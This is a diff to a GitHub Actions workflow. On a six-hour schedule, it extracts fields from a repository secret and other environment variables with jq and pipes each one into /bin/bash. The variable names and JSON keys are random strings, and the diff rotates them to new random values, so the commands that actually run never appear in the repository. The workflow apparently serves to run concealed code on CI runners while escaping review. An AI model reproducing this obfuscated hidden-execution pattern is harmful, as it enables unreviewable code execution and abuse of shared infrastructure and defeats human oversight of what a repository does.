@@ -3,27 +3,21 @@ name: chenfengqiao4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
-jobs:  # 11221
+    - cron: '26 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenfengqiao4567
         env:
-          wqtxr18: ${{ secrets.wqtxr18 }}
+          zw7843: ${{ secrets.zw7843 }}
         run: |
-          echo $wqtxr18 | jq -r .ozc802 | /bin/bash
-          echo $uya55151 | jq -r .hiik3 | /bin/bash
-          echo $alak0 | jq -r .tluk3488 | /bin/bash
-          echo $wf372 | jq -r .dspi04 | /bin/bash
-          echo $n871 | jq -r .zz7774 | /bin/bash
-          echo $kv7 | jq -r .mxty58 | /bin/bash
-          echo $vnyip0802 | jq -r .zpr3324 | /bin/bash
-          echo $xup99 | jq -r .rjvi13 | /bin/bash
-          echo $kw49479 | jq -r .vqlop9872 | /bin/bash
-          echo $a2995 | jq -r .b6254 | /bin/bash
-          echo $lqzug48 | jq -r .zehdb989 | /bin/bash
-          echo $a77 | jq -r .xnat6 | /bin/bash
-          echo $trqcr67891 | jq -r .iqja7 | /bin/bash
+          echo $zw7843 | jq -r .lbjbq6351 | /bin/bash
+          echo $hf515 | jq -r .pb61385 | /bin/bash
+          echo $qz72 | jq -r .kr60432 | /bin/bash
+          echo $nd10075 | jq -r .r6665 | /bin/bash
+          echo $bqdgl4 | jq -r .euw063 | /bin/bash
 
